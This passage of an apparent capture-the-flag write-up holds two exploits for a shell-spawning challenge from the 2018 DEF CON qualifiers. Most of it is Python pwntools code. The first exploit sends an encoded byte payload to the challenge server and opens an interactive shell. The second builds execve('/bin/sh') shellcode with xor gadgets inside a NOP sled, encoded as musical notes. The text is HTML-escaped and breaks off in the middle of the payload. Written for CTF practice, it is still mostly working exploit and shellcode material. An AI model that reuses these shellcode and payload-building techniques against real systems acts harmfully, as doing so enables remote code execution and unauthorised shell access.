\u0026#34;\\x8f\\x00\\x41\\x01\u0026#34; payload += \u0026#34;\\x24\\x00\\xf4\\x05\u0026#34; payload += \u0026#34;\\x24\\x00\\xe7\\x0b\u0026#34; payload += \u0026#34;\\x24\\x00\\xce\\x17\u0026#34; payload += \u0026#34;\\x8f\\x00\\x41\\x01\u0026#34; payload += \u0026#34;\\x8f\\x00\\xa7\\x02\u0026#34; payload += \u0026#34;\\x8f\\x00\\x30\\x00\u0026#34; payload += \u0026#34;\\x3b\\x02\\x8c\\x3f\\x36\\x5f\u0026#34; payload += \u0026#34;\\x3b\\x02\\x70\\x35\\x36\\x5f\u0026#34; payload += \u0026#34;\\x8f\\x00\\x4e\\x05\u0026#34; payload += \u0026#34;\\x24\\x00\\xf4\\x05\u0026#34; payload += \u0026#34;\\x8f\\x00\\x4e\\x05\u0026#34; payload += \u0026#34;\\x3b\\x02\\x8c\\x3f\\x36\\x5f\u0026#34; payload += \u0026#34;\\x3b\\x02\\x10\\x50\\x36\\x5f\u0026#34; payload += \u0026#34;\\x24\\x00\\xe7\\x0b\u0026#34; payload += \u0026#34;\\xd3\\x54\\x36\\x5f\u0026#34; * 6 payload += \u0026#34;\\x8f\\x00\\x4e\\x05\u0026#34; payload += \u0026#34;\\x3b\\x02\\x70\\x35\\x36\\x5f\u0026#34; payload += \u0026#34;\\x3b\\x02\\x10\\x50\\x36\\x5f\u0026#34; payload += \u0026#34;\\x24\\x00\\xce\\x17\u0026#34; payload += \u0026#34;\\xd3\\x54\\x36\\x5f\u0026#34; payload += \u0026#34;\\x8f\\x00\\x4e\\x05\u0026#34; #Inc ESI payload += \u0026#34;\\xd3\\x54\\x36\\x5f\u0026#34; * 41 #AND with ESI payload += \u0026#34;\\x3c\\x0b\u0026#34; payload += \u0026#34;\\x54\\x47\\x36\\x5f\u0026#34; #Clearing 4 values pointed by ESI payload += \u0026#34;\\x8f\\x00\\x2b\\x00\u0026#34; payload += \u0026#34;\\x24\\x00\\x2b\\x00\u0026#34; #0 payload += \u0026#34;\\x24\\x00\\xaa\\x00\u0026#34; #2 payload += \u0026#34;\\x8f\\x00\\xa7\\x02\u0026#34; payload += \u0026#34;\\x8f\\x00\\x55\\x00\u0026#34; #1 payload += \u0026#34;\\x24\\x00\\x55\\x00\u0026#34; #1 payload += \u0026#34;\\x8f\\x00\\x4e\\x05\u0026#34; #5 payload += \u0026#34;\\x8f\\x00\\x54\\x01\u0026#34; #3 payload += \u0026#34;\\x24\\x00\\x54\\x01\u0026#34; #3 payload += \u0026#34;\\x8f\\x00\\x35\\x15\u0026#34; #Inserting 89 bf 90 90 payload += \u0026#34;\\x8f\\x00\\xf4\\x05\u0026#34; payload += \u0026#34;\\x24\\x00\\x2b\\x00\u0026#34; payload += \u0026#34;\\x8f\\x00\\xf4\\x05\u0026#34; payload += \u0026#34;\\x8f\\x00\\xe7\\x0b\u0026#34; payload += \u0026#34;\\x24\\x00\\x55\\x00\u0026#34; payload += \u0026#34;\\x8f\\x00\\xe7\\x0b\u0026#34; payload += \u0026#34;\\x8f\\x00\\xce\\x17\u0026#34; payload += \u0026#34;\\x24\\x00\\xaa\\x00\u0026#34; payload += \u0026#34;\\x24\\x00\\x54\\x01\u0026#34; payload += \u0026#34;\\x8f\\x00\\xce\\x17\u0026#34; #Setting eax payload += \u0026#34;\\x8f\\x00\\x36\\x5f\u0026#34; payload += \u0026#34;\\x3b\\x02\\x54\\x47\\x36\\x5f\u0026#34; #Setting edx payload += \u0026#34;\\x36\\x5f\\x36\\x5f\u0026#34; * 41 #Padding payload += \u0026#34;\\x54\\x47\\x36\\x5f\u0026#34; * 250 #Terminator payload += \u0026#34;\\x00\\x00\u0026#34; def solve_pow(s, n): with context.local(log_level=\u0026#39;warning\u0026#39;): r = remote(\u0026#39;our_1337_server\u0026#39;, 13337) r.sendline(s + \u0026#39; \u0026#39; + str(n)) res = r.recvline().strip() r.close() return res def connect(): r = remote(\u0026#39;4e6b5b46.quals2018.oooverflow.io\u0026#39;, 31337) r.recvuntil(\u0026#39;Challenge: \u0026#39;) chall_s = r.recvline().strip() r.recvuntil(\u0026#39;n: \u0026#39;) chall_n = int(r.recvline().strip()) r.sendline(solve_pow(chall_s, chall_n)) return r while 1: try: #conn = connect() conn = remote(\u0026#34;127.0.0.1\u0026#34;, 4000) conn.recvuntil(\u0026#34;How does a shell sound?\u0026#34;) conn.send(payload) conn.interactive() except EOFError: conn.close() Second Exploit # The second idea was to write the mask and /bin/sh\\0 in the USER_INPUT after \\xff\\xff. We would set al to the desired byte through xoring it with bytes on the stack via edi and xor al back into our nop sled pointed by esi. This way we craft a shellcode in our nop sled.\nfrom pwn import * shellcode = \u0026#34;\u0026#34; shellcode += asm(\u0026#34;nop\u0026#34;) shellcode += asm(\u0026#34;nop\u0026#34;) shellcode += asm(\u0026#34;nop\u0026#34;) shellcode += asm(\u0026#34;nop\u0026#34;) shellcode += asm(\u0026#34;xor eax, eax\u0026#34;) shellcode += asm(\u0026#34;mov al, 0xb\u0026#34;) shellcode += asm(\u0026#34;mov ebx, 0x40404e7c\u0026#34;) shellcode += asm(\u0026#34;xor ecx, ecx\u0026#34;) shellcode += asm(\u0026#34;xor edx, edx\u0026#34;) shellcode += asm(\u0026#34;int 0x80\u0026#34;) # host = \u0026#34;127.0.0.1\u0026#34; # port = 4000 host = \u0026#39;4e6b5b46.quals2018.oooverflow.io\u0026#39; port = 31337 MASK = 0x60606ff0 NOP = \u0026#34;F3F3\u0026#34; #: [\u0026#34;inc esi\u0026#34;, \u0026#34;xor eax, dword ptr [esi + 0x33]\u0026#34;] n_to_f = {\u0026#39;G#1\u0026#39;: 101, \u0026#39;G#0\u0026#39;: 51, \u0026#39;G#3\u0026#39;: 404, \u0026#39;G#2\u0026#39;: 202, \u0026#39;G#5\u0026#39;: 1614, \u0026#39;G#4\u0026#39;: 807, \u0026#39;G#7\u0026#39;: 6456, \u0026#39;G#6\u0026#39;: 3228, \u0026#39;G#9\u0026#39;: 25823, \u0026#39;G#8\u0026#39;: 12912, \u0026#39;G7\u0026#39;: 6094, \u0026#39;G6\u0026#39;: 3047, \u0026#39;G5\u0026#39;: 1524, \u0026#39;G4\u0026#39;: 762, \u0026#39;G3\u0026#39;: 381, \u0026#39;G2\u0026#39;: 191, \u0026#39;G1\u0026#39;: 96, \u0026#39;G0\u0026#39;: 48, \u0026#39;G9\u0026#39;: 24374, \u0026#39;G8\u0026#39;: 12187, \u0026#39;D#8\u0026#39;: 9673, \u0026#39;D#9\u0026#39;: 19346, \u0026#39;D#6\u0026#39;: 2419, \u0026#39;A8\u0026#39;: 6840, \u0026#39;B4\u0026#39;: 480, \u0026#39;B5\u0026#39;: 960, \u0026#39;B6\u0026#39;: 1920, \u0026#39;B7\u0026#39;: 3839, \u0026#39;B0\u0026#39;: 30, \u0026#39;B1\u0026#39;: 60, \u0026#39;B2\u0026#39;: 120, \u0026#39;B3\u0026#39;: 240, \u0026#39;B8\u0026#39;: 7678, \u0026#39;B9\u0026#39;: 15355, \u0026#39;F#0\u0026#39;: 45, \u0026#39;F#1\u0026#39;: 90, \u0026#39;F#2\u0026#39;: 180, \u0026#39;F#3\u0026#39;: 360, \u0026#39;F#4\u0026#39;: 719, \u0026#39;F#5\u0026#39;: 1438, \u0026#39;F#6\u0026#39;: 2876, \u0026#39;F#7\u0026#39;: 5752, \u0026#39;F#8\u0026#39;: 11503, \u0026#39;F#9\u0026#39;: 23006, \u0026#39;E9\u0026#39;: 20496, \u0026#39;E8\u0026#39;: 10248, \u0026#39;E5\u0026#39;: 1281, \u0026#39;E4\u0026#39;: 641, \u0026#39;E7\u0026#39;: 5124, \u0026#39;E6\u0026#39;: 2562, \u0026#39;E1\u0026#39;: 81, \u0026#39;E0\u0026#39;: 41, \u0026#39;E3\u0026#39;: 321, \u0026#39;E2\u0026#39;: 161, \u0026#39;A#3\u0026#39;: 227, \u0026#39;A#2\u0026#39;: 114, \u0026#39;A#1\u0026#39;: 57, \u0026#39;A#0\u0026#39;: 29, \u0026#39;A#7\u0026#39;: 3624, \u0026#39;A#6\u0026#39;: 1812, \u0026#39;A#5\u0026#39;: 906, \u0026#39;A#4\u0026#39;: 453, \u0026#39;A#9\u0026#39;: 14493, \u0026#39;A#8\u0026#39;: 7247, \u0026#39;C9\u0026#39;: 16268, \u0026#39;C8\u0026#39;: 8134, \u0026#39;C3\u0026#39;: 255, \u0026#39;C2\u0026#39;: 128, \u0026#39;C1\u0026#39;: 64, \u0026#39;C0\u0026#39;: 32, \u0026#39;C7\u0026#39;: 4067, \u0026#39;C6\u0026#39;: 2034, \u0026#39;C5\u0026#39;: 1017, \u0026#39;C4\u0026#39;: 509, \u0026#39;F0\u0026#39;: 43, \u0026#39;F1\u0026#39;: 85, \u0026#39;F2\u0026#39;: 170, \u0026#39;F3\u0026#39;: 340, \u0026#39;F4\u0026#39;: 679, \u0026#39;F5\u0026#39;: 1358, \u0026#39;F6\u0026#39;: 2715, \u0026#39;F7\u0026#39;: 5429, \u0026#39;F8\u0026#39;: 10858, \u0026#39;F9\u0026#39;: 21715, \u0026#39;A1\u0026#39;: 54, \u0026#39;A0\u0026#39;: 27, \u0026#39;A3\u0026#39;: 214, \u0026#39;A2\u0026#39;: 107, \u0026#39;A5\u0026#39;: 855, \u0026#39;A4\u0026#39;: 428, \u0026#39;A7\u0026#39;: 3420, \u0026#39;A6\u0026#39;: 1710, \u0026#39;A9\u0026#39;: 13680, \u0026#39;D#7\u0026#39;: 4837, \u0026#39;D#4\u0026#39;: 605, \u0026#39;D#5\u0026#39;: 1210, \u0026#39;D#2\u0026#39;: 152, \u0026#39;D#3\u0026#39;: 303, \u0026#39;D#0\u0026#39;: 38, \u0026#39;D#1\u0026#39;: 76, \u0026#39;C#9\u0026#39;: 17235, \u0026#39;C#8\u0026#39;: 8618, \u0026#39;C#5\u0026#39;: 1078, \u0026#39;C#4\u0026#39;: 539, \u0026#39;C#7\u0026#39;: 4309, \u0026#39;C#6\u0026#39;: 2155, \u0026#39;C#1\u0026#39;: 68, \u0026#39;C#0\u0026#39;: 34, \u0026#39;C#3\u0026#39;: 270, \u0026#39;C#2\u0026#39;: 135, \u0026#39;D8\u0026#39;: 9130, \u0026#39;D9\u0026#39;: 18260, \u0026#39;D6\u0026#39;: 2283, \u0026#39;D7\u0026#39;: 4565, \u0026#39;D4\u0026#39;: 571, \u0026#39;D5\u0026#39;: 1142, \u0026#39;D2\u0026#39;: 143, \u0026#39;D3\u0026#39;: 286, \u0026#39;D0\u0026#39;: 36, \u0026#39;D1\u0026#39;: 72} def encoder(note): r = \u0026#34;\u0026#34; i = 0 while i \u0026lt; len(note): if i+2 \u0026lt;= len(note) and note[i:i+2] in n_to_f: r += p16(n_to_f[note[i:i+2]]) i += 2 elif i+3 \u0026lt;= len(note) and note[i:i+3] in n_to_f: r += p16(n_to_f[note[i:i+3]]) i += 3 else: raise RuntimeError(\u0026#34;fuuuuuuuuuuuuuuuck \u0026#34;+str(i)) return r def pow_hash(challenge, solution): return hashlib.sha256(challenge.encode(\u0026#39;ascii\u0026#39;) + struct.pack(\u0026#39;\u0026lt;Q\u0026#39;, solution)).hexdigest() def check_pow(challenge, n, solution): h = pow_hash(challenge, solution) return (int(h, 16) % (2**n)) == 0 def solve_pow(challenge, n): candidate = 0 while True: if check_pow(challenge, n, candidate): return candidate candidate += 1 payload = \u0026#34;\u0026#34; # set eax to 0x40404e78 -\u0026gt; 0x60607bf7 payload += encoder(\u0026#34;\u0026#34;.join([\u0026#39;G8\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;E8\u0026#39;, \u0026#39;G0\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;D2\u0026#39;, \u0026#39;C7\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;D4\u0026#39;, \u0026#39;C3\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;D4\u0026#39;, \u0026#39;F6\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;B0\u0026#39;, \u0026#39;B4\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;A4\u0026#39;, \u0026#39;A4\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;E0\u0026#39;, \u0026#39;D1\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G3\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G7\u0026#39;])) # B6C#0\u0026#34; : [\u0026#34;inc edx\u0026#34;, \u0026#34;inc ebx\u0026#34;, \u0026#34;n esi, dword ptr [eax]\u0026#34;] \u0026lt; questo per l\u0026#39;and con la maschera payload += encoder(\u0026#34;B6A#0\u0026#34;) # esi alignement # F8F0 : [\u0026#34;inc esi\u0026#34;, \u0026#34;cmp byte ptr [esi + 0x30], al\u0026#34;] payload += encoder(\u0026#34;F8F0\u0026#34;)*3 #### COPYING THE SHELLCODE INTO THE NOP SLED # Set al 0xa3 payload += encoder(\u0026#34;\u0026#34;.join([\u0026#39;B3\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G8\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G9\u0026#39;, \u0026#39;A2\u0026#39;, \u0026#39;E3\u0026#39;])) # Write on shellcode and inc esi to write next byte # F0F0 : [\u0026#34;inc esi\u0026#34;, \u0026#34;xor byte ptr [esi + 0x30], al\u0026#34;]; payload += encoder(\u0026#34;F0F0\u0026#34;) # Set al 0xd6 payload += encoder(\u0026#34;\u0026#34;.join([\u0026#39;D5\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;E4\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;E0\u0026#39;, \u0026#39;D9\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G4\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G7\u0026#39;])) # Write on shellcode and inc esi to write next byte # F0F0 : [\u0026#34;inc esi\u0026#34;, \u0026#34;xor byte ptr [esi + 0x30], al\u0026#34;]; payload += encoder(\u0026#34;F0F0\u0026#34;) #Set al 0xa3 payload += encoder(\u0026#34;\u0026#34;.join([\u0026#39;D5\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;E4\u0026#39;, \u0026#39;D5\u0026#39;, \u0026#39;E0\u0026#39;, \u0026#39;D9\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G4\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G5\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G6\u0026#39;, \u0026#39;B3\u0026#39;, \u0026#39;G7\u0026#39;])) # Write on shellcode and inc esi to write next byte # F0F0 : [\u0026#34;inc esi\u0026#34;, \u0026#34;xor byte ptr [esi + 0x30], al\u0026#34;]; payload += 